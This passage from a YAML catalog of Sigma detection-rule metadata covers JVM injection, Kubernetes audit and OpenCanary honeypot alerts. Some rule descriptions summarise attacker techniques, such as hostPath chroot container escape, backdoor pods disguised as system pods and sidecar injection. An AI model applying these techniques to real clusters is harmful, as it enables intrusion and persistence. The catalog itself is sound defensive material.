  platform: jvm
  product: jvm
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://www.wix.engineering/post/threat-and-vulnerability-hunting-with-application-server-error-logs
  false_positives:
  - Application bugs
  notes: ''
- detection_id: 4d0af518-828e-4a04-a751-a7d03f3046ad
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/jvm/java_ognl_injection_exploitation_attempt.yml
  name: Potential OGNL Injection Exploitation In JVM Based Application
  description: 'Detects potential OGNL Injection exploitation, which may lead to RCE.

    OGNL is an expression language that is supported in many JVM based systems.

    OGNL Injection is the reason for some high profile RCE''s such as Apache Struts
    (CVE-2017-5638) and Confluence (CVE-2022-26134)

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: jvm
  product: jvm
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2017-5638
  - cve.2022-26134
  time_window: ''
  references:
  - https://www.wix.engineering/post/threat-and-vulnerability-hunting-with-application-server-error-logs
  false_positives:
  - Application bugs
  notes: ''
- detection_id: d65f37da-a26a-48f8-8159-3dde96680ad2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/jvm/java_rce_exploitation_attempt.yml
  name: Process Execution Error In JVM Based Application
  description: Detects process execution related exceptions in JVM based apps, often
    relates to RCE
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: jvm
  product: jvm
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://www.wix.engineering/post/threat-and-vulnerability-hunting-with-application-server-error-logs
  false_positives:
  - Application bugs
  notes: ''
- detection_id: c4e06896-e27c-4583-95ac-91ce2279345d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/jvm/java_xxe_exploitation_attempt.yml
  name: Potential XXE Exploitation Attempt In JVM Based Application
  description: Detects XML parsing issues, if the application expects to work with
    XML make sure that the parser is initialized safely.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: high
  status: test
  platform: jvm
  product: jvm
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://rules.sonarsource.com/java/RSPEC-2755
  - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
  - https://www.wix.engineering/post/threat-and-vulnerability-hunting-with-application-server-error-logs
  false_positives:
  - If the application expects to work with XML there may be parsing issues that don't
    necessarily mean XXE.
  notes: ''
- detection_id: eed82177-38f5-4299-8a76-098d50d225ab
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/kubernetes/audit/kubernetes_audit_change_admission_controller.yml
  name: Kubernetes Admission Controller Modification
  description: 'Detects when a modification (create, update or replace) action is
    taken that affects mutating or validating webhook configurations, as they can
    be used by an adversary to achieve persistence or exfiltrate access credentials.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: kubernetes
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1078
  - T1552
  - T1552.007
  tags:
  - attack.privilege-escalation
  - attack.initial-access
  - attack.defense-evasion
  - attack.persistence
  - attack.t1078
  - attack.credential-access
  - attack.t1552
  - attack.t1552.007
  time_window: ''
  references:
  - https://kubernetes.io/docs/reference/config-api/apiserver-audit.v1/
  - https://security.padok.fr/en/blog/kubernetes-webhook-attackers
  false_positives:
  - Modifying the Kubernetes Admission Controller may need to be done by a system
    administrator.
  - Automated processes may need to take these actions and may need to be filtered.
  notes: ''
- detection_id: 0c9b3bda-41a6-4442-9345-356ae86343dc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/kubernetes/audit/kubernetes_audit_cronjob_modification.yml
  name: Kubernetes CronJob/Job Modification
  description: 'Detects when a Kubernetes CronJob or Job is created or modified.

    A Kubernetes Job creates one or more pods to accomplish a specific task, and a
    CronJob creates Jobs on a recurring schedule.

    An adversary can take advantage of this Kubernetes object to schedule Jobs to
    run containers that execute malicious code within a cluster, allowing them to
    achieve persistence.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: kubernetes
  product: audit
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.execution
  time_window: ''
  references:
  - https://kubernetes.io/docs/reference/config-api/apiserver-audit.v1/
  - https://www.redhat.com/en/blog/protecting-kubernetes-against-mitre-attck-persistence#technique-33-kubernetes-cronjob
  false_positives:
  - Modifying a Kubernetes Job or CronJob may need to be done by a system administrator.
  - Automated processes may need to take these actions and may need to be filtered.
  notes: ''
- detection_id: 40967487-139b-4811-81d9-c9767a92aa5a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/kubernetes/audit/kubernetes_audit_deployment_deleted.yml
  name: Deployment Deleted From Kubernetes Cluster
  description: 'Detects the removal of a deployment from a Kubernetes cluster.

    This could indicate disruptive activity aiming to impact business operations.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: kubernetes
  product: audit
  category: application
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1498
  tags:
  - attack.t1498
  - attack.impact
  time_window: ''
  references:
  - https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Data%20destruction/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3132570d-cab2-4561-9ea6-1743644b2290
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/kubernetes/audit/kubernetes_audit_events_deleted.yml
  name: Kubernetes Events Deleted
  description: 'Detects when events are deleted in Kubernetes.

    An adversary may delete Kubernetes events in an attempt to evade detection.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: kubernetes
  product: audit
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1070
  tags:
  - attack.defense-evasion
  - attack.t1070
  time_window: ''
  references:
  - https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Delete%20K8S%20events/
  false_positives:
  - Unknown
  notes: ''
- detection_id: a1b0ca4e-7835-413e-8471-3ff2b8a66be6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/kubernetes/audit/kubernetes_audit_exec_into_container.yml
  name: Potential Remote Command Execution In Pod Container
  description: 'Detects attempts to execute remote commands, within a Pod''s container
    using e.g. the "kubectl exec" command.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: kubernetes
  product: audit
  category: application
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1609
  tags:
  - attack.t1609
  - attack.execution
  time_window: ''
  references:
  - https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Exec%20into%20container/
  false_positives:
  - Legitimate debugging activity. Investigate the identity performing the requests
    and their authorization.
  notes: ''
- detection_id: 402b955c-8fe0-4a8c-b635-622b4ac5f902
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/kubernetes/audit/kubernetes_audit_hostpath_mount.yml
  name: Container With A hostPath Mount Created
  description: 'Detects creation of a container with a hostPath mount.

    A hostPath volume mounts a directory or a file from the node to the container.

    Attackers who have permissions to create a new pod in the cluster may create one
    with a writable hostPath volume and chroot to escape to the underlying node.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: kubernetes
  product: audit
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1611
  tags:
  - attack.t1611
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Writable%20hostPath%20mount/
  - https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216
  false_positives:
  - The DaemonSet controller creates pods with hostPath volumes within the kube-system
    namespace.
  notes: ''
- detection_id: a80d927d-ac6e-443f-a867-e8d6e3897318
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/kubernetes/audit/kubernetes_audit_pod_in_system_namespace.yml
  name: Creation Of Pod In System Namespace
  description: 'Detects deployments of pods within the kube-system namespace, which
    could be intended to imitate system pods.

    System pods, created by controllers such as Deployments or DaemonSets have random
    suffixes in their names.

    Attackers can use this fact and name their backdoor pods as if they were created
    by these controllers to avoid detection.

    Deployment of such a backdoor container e.g. named kube-proxy-bv61v, could be
    attempted in the kube-system namespace alongside the other administrative containers.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: kubernetes
  product: audit
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1036.005
  tags:
  - attack.defense-evasion
  - attack.t1036.005
  time_window: ''
  references:
  - https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Pod%20or%20container%20name%20similarily/
  false_positives:
  - System components such as daemon-set-controller and kube-scheduler also create
    pods in the kube-system namespace
  notes: ''
- detection_id: c5cd1b20-36bb-488d-8c05-486be3d0cb97
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/kubernetes/audit/kubernetes_audit_privileged_pod_creation.yml
  name: Privileged Container Deployed
  description: 'Detects the creation of a "privileged" container, an action which
    could be indicative of a threat actor mounting a container breakout attacks.

    A privileged container is a container that can access the host with all of the
    root capabilities of the host machine. This allows it to view, interact and modify
    processes, network operations, IPC calls, the file system, mount points, SELinux
    configurations etc. as the root user on the host.

    Various versions of "privileged" containers can be specified, e.g. by setting
    the securityContext.privileged flag in the resource specification, setting non-standard
    Linux capabilities, or configuring the hostNetwork/hostPID fields

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: kubernetes
  product: audit
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1611
  tags:
  - attack.t1611
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Privileged%20container/
  - https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-kubernetes.html#privilegeescalation-kubernetes-privilegedcontainer
  - https://www.elastic.co/guide/en/security/current/kubernetes-pod-created-with-hostnetwork.html
  - https://www.elastic.co/guide/en/security/current/kubernetes-container-created-with-excessive-linux-capabilities.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 84b777bd-c946-4d17-aa2e-c39f5a454325
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/kubernetes/audit/kubernetes_audit_rbac_permisions_listing.yml
  name: RBAC Permission Enumeration Attempt
  description: 'Detects identities attempting to enumerate their Kubernetes RBAC permissions.

    In the early stages of a breach, attackers will aim to list the permissions they
    have within the compromised environment.

    In a Kubernetes cluster, this can be achieved by interacting with the API server,
    and querying the SelfSubjectAccessReview API via e.g. a "kubectl auth can-i --list"
    command.

    This will enumerate the Role-Based Access Controls (RBAC) rules defining the compromised
    user''s authorization.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - risk_scoring_or_weighting
  severity: low
  status: test
  platform: kubernetes
  product: audit
  category: application
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1069.003
  - T1087.004
  tags:
  - attack.t1069.003
  - attack.t1087.004
  - attack.discovery
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/kubernetes-suspicious-self-subject-review.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 10b97915-ec8d-455f-a815-9a78926585f6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/kubernetes/audit/kubernetes_audit_rolebinding_modification.yml
  name: Kubernetes Rolebinding Modification
  description: 'Detects when a Kubernetes Rolebinding is created or modified.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 3
  predictive_readiness_factors:
  - risk_scoring_or_weighting
  severity: medium
  status: test
  platform: kubernetes
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://kubernetes.io/docs/reference/config-api/apiserver-audit.v1/
  - https://medium.com/@seifeddinerajhi/kubernetes-rbac-privilege-escalation-exploits-and-mitigations-26c07629eeab
  false_positives:
  - Modifying a Kubernetes Rolebinding may need to be done by a system administrator.
  - Automated processes may need to take these actions and may need to be filtered.
  notes: ''
- detection_id: eeb3e9e1-b685-44e4-9232-6bb701f925b5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/kubernetes/audit/kubernetes_audit_secrets_enumeration.yml
  name: Kubernetes Secrets Enumeration
  description: Detects enumeration of Kubernetes secrets.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: low
  status: test
  platform: kubernetes
  product: audit
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1552.007
  tags:
  - attack.t1552.007
  - attack.credential-access
  time_window: ''
  references:
  - https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/List%20K8S%20secrets/
  false_positives:
  - The Kubernetes dashboard occasionally accesses the kubernetes-dashboard-key-holder
    secret
  notes: ''
- detection_id: 58d31a75-a4f8-4c40-985b-373d58162ca2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/kubernetes/audit/kubernetes_audit_secrets_modified_or_deleted.yml
  name: Kubernetes Secrets Modified or Deleted
  description: 'Detects when Kubernetes Secrets are Modified or Deleted.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: kubernetes
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  time_window: ''
  references:
  - https://kubernetes.io/docs/reference/config-api/apiserver-audit.v1/
  - https://commandk.dev/blog/guide-to-audit-k8s-secrets-for-compliance/
  false_positives:
  - Secrets being modified or deleted may be performed by a system administrator.
  - Automated processes may need to take these actions and may need to be filtered.
  notes: ''
- detection_id: e31bae15-83ed-473e-bf31-faf4f8a17d36
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/kubernetes/audit/kubernetes_audit_serviceaccount_creation.yml
  name: New Kubernetes Service Account Created
  description: 'Detects creation of new Kubernetes service account, which could indicate
    an attacker''s attempt to persist within a cluster.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: test
  platform: kubernetes
  product: audit
  category: application
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1136
  tags:
  - attack.persistence
  - attack.t1136
  time_window: ''
  references:
  - https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/container%20service%20account/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ad9012a6-e518-4432-9890-f3b82b8fc71f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/kubernetes/audit/kubernetes_audit_sidecar_injection.yml
  name: Potential Sidecar Injection Into Running Deployment
  description: 'Detects attempts to inject a sidecar container into a running deployment.

    A sidecar container is an additional container within a pod, that resides alongside
    the main container.

    One way to add containers to running resources like Deployments/DeamonSets/StatefulSets,
    is via a "kubectl patch" operation.

    By injecting a new container within a legitimate pod, an attacker can run their
    code and hide their activity, instead of running their own separated pod in the
    cluster.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: kubernetes
  product: audit
  category: application
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1609
  tags:
  - attack.t1609
  - attack.execution
  time_window: ''
  references:
  - https://kubernetes.io/docs/tasks/manage-kubernetes-objects/update-api-object-kubectl-patch
  - https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/Sidecar%20Injection/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0d933542-1f1f-420d-97d4-21b2c3c492d9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/kubernetes/audit/kubernetes_audit_unauthorized_unauthenticated_actions.yml
  name: Kubernetes Unauthorized or Unauthenticated Access
  description: 'Detects when a request to the Kubernetes API is rejected due to lack
    of authorization or due to an expired authentication token being used.

    This may indicate an attacker attempting to leverage credentials they have obtained.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: low
  status: test
  platform: kubernetes
  product: audit
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://kubernetes.io/docs/reference/config-api/apiserver-audit.v1/
  - https://www.datadoghq.com/blog/monitor-kubernetes-audit-logs/#monitor-api-authentication-issues
  false_positives:
  - A misconfigured RBAC policy, a mistake by a valid user, or a wider issue with
    authentication tokens can also generate these errors.
  notes: ''
- detection_id: 97661d9d-2beb-4630-b423-68985291a8af
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/nodejs/nodejs_rce_exploitation_attempt.yml
  name: Potential RCE Exploitation Attempt In NodeJS
  description: Detects process execution related errors in NodeJS. If the exceptions
    are caused due to user input then they may suggest an RCE vulnerability.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
  platform: nodejs
  product: nodejs
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://www.wix.engineering/post/threat-and-vulnerability-hunting-with-application-server-error-logs
  false_positives:
  - Puppeteer invocation exceptions often contain child_process related errors, that
    doesn't necessarily mean that the app is vulnerable.
  notes: ''
- detection_id: 6991bc2b-ae2e-447f-bc55-3a1ba04c14e5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_ftp_login_attempt.yml
  name: OpenCanary - FTP Login Attempt
  description: Detects instances where an FTP service on an OpenCanary node has had
    a login attempt.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1021
  - T1190
  tags:
  - attack.initial-access
  - attack.exfiltration
  - attack.lateral-movement
  - attack.t1190
  - attack.t1021
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 4fe17521-aef3-4e6a-9d6b-4a7c8de155a8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_git_clone_request.yml
  name: OpenCanary - GIT Clone Request
  description: Detects instances where a GIT service on an OpenCanary node has had
    Git Clone request.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1213
  tags:
  - attack.collection
  - attack.t1213
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: af6c3078-84cd-4c68-8842-08b76bd81b13
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_http_get.yml
  name: OpenCanary - HTTP GET Request
  description: Detects instances where an HTTP service on an OpenCanary node has received
    a GET request.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: af1ac430-df6b-4b38-b976-0b52f07a0252
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_http_post_login_attempt.yml
  name: OpenCanary - HTTP POST Login Attempt
  description: 'Detects instances where an HTTP service on an OpenCanary node has
    had login attempt via Form POST.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 5498fc09-adc6-4804-b9d9-5cca1f0b8760
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_httpproxy_login_attempt.yml
  name: OpenCanary - HTTPPROXY Login Attempt
  description: 'Detects instances where an HTTPPROXY service on an OpenCanary node
    has had an attempt to proxy another page.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics: []
  techniques:
  - T1090
  tags:
  - attack.initial-access
  - attack.defense-evasion
  - attack.command-and-control
  - attack.t1090
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 3ec9a16d-0b4f-4967-9542-ebf38ceac7dd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_mssql_login_sqlauth.yml
  name: OpenCanary - MSSQL Login Attempt Via SQLAuth
  description: 'Detects instances where an MSSQL service on an OpenCanary node has
    had a login attempt using SQLAuth.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1003
  - T1213
  tags:
  - attack.credential-access
  - attack.collection
  - attack.t1003
  - attack.t1213
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 6e78f90f-0043-4a01-ac41-f97681613a66
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_mssql_login_winauth.yml
  name: OpenCanary - MSSQL Login Attempt Via Windows Authentication
  description: 'Detects instances where an MSSQL service on an OpenCanary node has
    had a login attempt using Windows Authentication.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1003
  - T1213
  tags:
  - attack.credential-access
  - attack.collection
  - attack.t1003
  - attack.t1213
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e7d79a1b-25ed-4956-bd56-bd344fa8fd06
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_mysql_login_attempt.yml
  name: OpenCanary - MySQL Login Attempt
  description: Detects instances where a MySQL service on an OpenCanary node has had
    a login attempt.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1003
  - T1213
  tags:
  - attack.credential-access
  - attack.collection
  - attack.t1003
  - attack.t1213
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 7cded4b3-f09e-405a-b96f-24248433ba44
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_ntp_monlist.yml
  name: OpenCanary - NTP Monlist Request
  description: Detects instances where an NTP service on an OpenCanary node has had
    a NTP monlist request.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1498
  tags:
  - attack.impact
  - attack.t1498
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 547dfc53-ebf6-4afe-8d2e-793d9574975d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_redis_command.yml
  name: OpenCanary - REDIS Action Command Attempt
  description: Detects instances where a REDIS service on an OpenCanary node has had
    an action command attempted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1003
  - T1213
  tags:
  - attack.credential-access
  - attack.collection
  - attack.t1003
  - attack.t1213
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e30de276-68ec-435c-ab99-ef3befec6c61
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_sip_request.yml
  name: OpenCanary - SIP Request
  description: Detects instances where an SIP service on an OpenCanary node has had
    a SIP request.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1123
  tags:
  - attack.collection
  - attack.t1123
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 22777c9e-873a-4b49-855f-6072ab861a52
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/application/opencanary/opencanary_smb_file_open.yml
  name: OpenCanary - SMB File Open Request
  description: Detects instances where an SMB service on an OpenCanary node has had
    a file open request.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: opencanary
  product: opencanary
  category: application
  data_sources: []
  tactics:
  - Collection
  techniques:
  - T1005
  - T1021
  tags:
  - attack.lateral-movement
  - attack.collection
  - attack.t1021
  - attack.t1005
  time_window: ''
  references:
  - https://opencanary.readthedocs.io/en/latest/starting/configuration.html#services-configuration
  - https://github.com/thinkst/opencanary/blob/a0896adfcaf0328cfd5829fe10d2878c7445138e/opencanary/logger.py#L52
  false_positives:
  - Unlikely
  notes: ''
- detection_id: e9856028-fd4e-46e6-b3d1-10f7ceb95078
  source_id: sigmahq_sigma
